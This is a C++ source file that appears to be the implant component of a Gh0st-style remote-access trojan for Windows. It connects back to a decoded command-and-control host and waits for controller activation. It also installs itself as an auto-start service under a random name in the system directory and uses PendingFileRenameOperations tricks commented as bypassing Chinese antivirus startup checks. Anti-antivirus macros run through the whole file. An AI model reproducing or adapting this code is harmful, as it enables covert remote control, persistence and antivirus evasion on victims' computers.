// Server.cpp : Defines the entry point for the application.
//
#include "stdafx.h"
#include <stdio.h> 
#include <windows.h> 
#include <shlobj.h>

#include "ClientSocket.h"
#include "decode.h"
#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "common/until.h"
// #include "head.h"
// #pragma comment(linker, "/OPT:NOWIN98")
// #pragma comment(lib, "DELAYIMP.LIB")
// #pragma comment(linker, "/DELAYLOAD:WININET.dll")
// #pragma comment(linker, "/DELAYLOAD:WS2_32.dll")
// #pragma comment(linker, "/DELAYLOAD:PSAPI.DLL")
// #pragma comment(linker, "/DELAYLOAD:GDI32.dll")
// #pragma comment(linker, "/DELAYLOAD:ADVAPI32.dll")
// #pragma comment(linker, "/DELAYLOAD:SHELL32.dll")
// #pragma comment(linker, "/DELAYLOAD:WINMM.dll")
// #pragma comment(linker, "/DELAYLOAD:USER32.dll")
// #pragma comment(linker, "/DELAYLOAD:WTSAPI32.dll")
// #pragma comment(linker, "/DELAYLOAD:AVICAP32.dll")
// #pragma comment(linker, "/DELAYLOAD:SHLWAPI.dll")
// #pragma comment(linker, "/DELAY:nobind")
// #pragma comment(linker, "/DELAY:unload")

enum
{
	NOT_CONNECT, //  还没有连接
		GETLOGINFO_ERROR,
		CONNECT_ERROR,
		HEARTBEATTIMEOUT_ERROR
};

#define		HEART_BEAT_TIME		1000 * 60 // 心跳时间

MODIFY_DATA modify_data = 
{
	"           D         ",
		"",
		"",
		"",
		"",
		"",
		"",
		"",
		TRUE,			//TRUE为服务启动
		TRUE,			//TRUE为写启动项
		TRUE,			//FALSE为安装,TRUE为绿色安装
};

int StormRand(int count);
char	*lpszHost = NULL;
DWORD	dwPort;

BOOL Login()
{
	HANDLE	hEvent = NULL;
	char	strKillEvent[100];
	wsprintf(strKillEvent, "%s %d",MyDecode(modify_data.szDns),GetTickCount());

	HANDLE m_hMutex;
	m_hMutex = CreateMutex(NULL, FALSE, MyDecode(modify_data.szDns));
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		exit(0);
		ExitProcess(0);
		return -1;
	}

	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT;
	while (1)
	{
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			for (int i = 0; i < 1000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false,strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;					
				}
				Sleep(200);
			}
		}
		lpszHost = MyDecode(modify_data.szDns);
		dwPort = atoi(MyDecode(modify_data.dwPort));

		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(lpszHost,dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}

		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(NULL, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient,strKillEvent,lpszHost,dwPort);
		socketClient.setManagerCallBack(&manager);
		
		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!manager.IsActived())
			continue;
		
		//////////////////////////////////////////////////////////////////////////
		
		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();
		
		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);
		
		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
		FUCKAV
	return 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
int StormRand(int count)
{
	unsigned long Time=GetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%count;
	return seed;
}

static BOOL fDelete_Me=FALSE;
static void RunService(char *m_ServiceName,char *m_DisplayName,char *m_Description)
{
	char FilePath[MAX_PATH];
	GetModuleFileName(NULL,FilePath,MAX_PATH);
	
	char SystemPath[MAX_PATH];
	GetSystemDirectory(SystemPath,MAX_PATH);
	if (strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
	{
		char FileName[80];
		wsprintf(FileName,"%c%c%c%c%c%c.exe",'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26));//随即发生一个文件名
		strcat(SystemPath,"\\");
		strcat(SystemPath,FileName);
		CopyFile(FilePath,SystemPath,FALSE);
		memset(FilePath,0,MAX_PATH);
		strcpy(FilePath,SystemPath);
		fDelete_Me = TRUE;
	}

	char Desc[MAX_PATH];
	HKEY key=NULL;
	SC_HANDLE newService=NULL, scm=NULL;
	__try
	{
		scm = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
		if (!scm)
			__leave;
		newService = CreateService(
			scm, m_ServiceName, m_DisplayName,
	/*SERVICE_ALL_ACCESS|SERVICE_INTERACTIVE_PROCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE,*/
		SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG,
		SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE,
		FilePath,NULL, NULL, NULL, NULL, NULL);
		//锁定一下服务...
		SC_LOCK sc_lock=LockServiceDatabase(scm);
		SERVICE_DESCRIPTION Service_Descrip={&modify_data.Serdisplay[0]};
		ChangeServiceConfig2(newService,SERVICE_CONFIG_DESCRIPTION,&Service_Descrip);
		UnlockServiceDatabase(sc_lock);
		if (newService == NULL)
		{
			if (GetLastError() == ERROR_SERVICE_EXISTS)
			{
				newService = OpenService(scm,m_ServiceName,SERVICE_ALL_ACCESS);
				if (newService==NULL)
					__leave;
				else
					StartService(newService,0, 0);
			}
		}
		if (!StartService(newService,0, 0))
			__leave;
		strcpy(Desc,"SYSTEM\\CurrentControlSet\\Services\\");
		strcat(Desc,m_ServiceName);
		RegOpenKey(HKEY_LOCAL_MACHINE,Desc,&key);
		RegSetValueEx(key,"Description",0,REG_SZ,(CONST BYTE*)m_Description,lstrlen(m_Description));
	}

	__finally
	{
		if (newService!=NULL)
			CloseServiceHandle(newService);
		if (scm!=NULL)
			CloseServiceHandle(scm);
		if (key!=NULL) 
			RegCloseKey(key);
	}
}

//以下是服务的外壳。不用管这么多。因为要写注释也不知道怎么写。格式是固定的
static BOOL service_is_exist()
{
	char SubKey[MAX_PATH]={0};
	strcpy(SubKey,"SYSTEM\\CurrentControlSet\\Services\\");
	strcat(SubKey,modify_data.SerName);
	
	HKEY hKey;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
		return TRUE;
	else
		return FALSE;
}

static SERVICE_STATUS srvStatus;
static SERVICE_STATUS_HANDLE hSrv;

static void __stdcall SvcCtrlFnct(DWORD CtrlCode)
{
	switch(CtrlCode)
	{
	case SERVICE_CONTROL_STOP:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_PAUSE:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_PAUSE_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_CONTINUE_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_RUNNING;
		break;
	}
	SetServiceStatus(hSrv,&srvStatus);
}

void ServiceMain(DWORD dwargc,wchar_t* argv[])
{
	hSrv=RegisterServiceCtrlHandler(modify_data.SerName,SvcCtrlFnct);
	srvStatus.dwServiceType=SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwControlsAccepted=SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode=NO_ERROR;
	srvStatus.dwWaitHint=2000;

	srvStatus.dwCheckPoint=1;
	srvStatus.dwCurrentState=SERVICE_START_PENDING;
	SetServiceStatus(hSrv,&srvStatus);
	srvStatus.dwCheckPoint=0;
	Sleep(500);
	srvStatus.dwCurrentState=SERVICE_RUNNING;

	SetServiceStatus(hSrv,&srvStatus);

	while(1)
	{
		Login();
		Sleep(50);
	}
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
		FUCKAV
	return;
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	WNDCLASS m_WndClass;
	ZeroMemory(&m_WndClass,sizeof(WNDCLASS));
	
	//水平拖动
	m_WndClass.style=CS_HREDRAW;
	
	//回调函数地址
	m_WndClass.lpfnWndProc=NULL;
	
	//附加数据  总是为NULL
	m_WndClass.cbClsExtra = NULL;
	
	//附加数据  总是为NULL
	m_WndClass.cbWndExtra = NULL;
	
	//程序实例
	m_WndClass.hInstance  = NULL;
	
	//程序Icon
	m_WndClass.hIcon = LoadIcon(NULL,IDI_INFORMATION);
	
	//程序光标
	m_WndClass.hCursor = LoadCursor(NULL,IDC_HELP);
	
	//背景颜色
	m_WndClass.hbrBackground = (HBRUSH)GetStockObject(GRAY_BRUSH);
	
	//程序类名
	m_WndClass.lpszClassName = NULL;
	
	//注册类名
	RegisterClass(&m_WndClass);

	// TODO: Place code here.
	//////////////////////////////////////////////////////////////////////////
	// 让启动程序时的小漏斗马上消失
    GetInputState();
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);

	//创建互斥
	char	strInstallModule[MAX_PATH]; 
	memset(strInstallModule, 0, sizeof(strInstallModule)); 
	GetModuleFileName(NULL,strInstallModule,sizeof(strInstallModule));
	
	HANDLE m_hMutex;
	m_hMutex = CreateMutex(NULL, FALSE, strInstallModule);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		exit(0);
		ExitProcess(0);
		return -1;
	}

	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV

	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	
	if(!modify_data.bRunOnce)//如果不是绿色安装
	{
		if (modify_data.bServer == TRUE)
		{
			if (service_is_exist())
			{	
				SERVICE_TABLE_ENTRY serviceTable[] = 
				{
					{modify_data.SerName,(LPSERVICE_MAIN_FUNCTION) ServiceMain},
					{NULL,NULL}
				};
				StartServiceCtrlDispatcher(serviceTable);
			}
			else
			{
				RunService(modify_data.SerName,modify_data.Serdisplay ,modify_data.Serdesc);
			}
		}

		if (modify_data.bRuns == TRUE)
		{
			////////////////过管家，瑞星，金山启动项///////////////
			char szMyFilePath[MAX_PATH];
        	GetModuleFileName(NULL,szMyFilePath,MAX_PATH);
	        char Sys[MAX_PATH];
        	char FileN[100];
        	SHGetSpecialFolderPath(NULL,Sys, 24, FALSE);
        	wsprintf(FileN,"\\scvost.bat");//随即发生一个文件名
        	strcat(Sys,"\\");
        	strcat(Sys,FileN);
        	HKEY hKey;
        	DWORD Action=0;
        	char MyPat[] = "c:\\1.exe";
        	char MyPath[] = "\\??\\c:\\1.exe\0";
        	CopyFile(szMyFilePath,MyPat,FALSE);
        	char bUuIt[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','S','e','s','s','i','o','n',' ','M','a','n','a','g','e','r','\0'};
	
	        RegCreateKeyExA (HKEY_LOCAL_MACHINE,bUuIt,0,NULL,REG_OPTION_NON_VOLATILE,KEY_WRITE,NULL,&hKey,&Action);
        	RegSetValueEx(hKey,"PendingFileRenameOperations",NULL,REG_MULTI_SZ,(const unsigned char *)MyPath,sizeof(MyPath));
        	RegCloseKey(hKey);
        	MoveFileEx(Sys,0,MOVEFILE_DELAY_UNTIL_REBOOT);
			/////////////////////////////////////////////////////
	//return 0;
//}
			
			while(1)
			{
				Login();
				Sleep(50);
			}
		}
	}
	else
	{
		while(1)
		{
			Login();
			Sleep(50);
		}
	}
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	return 0;
}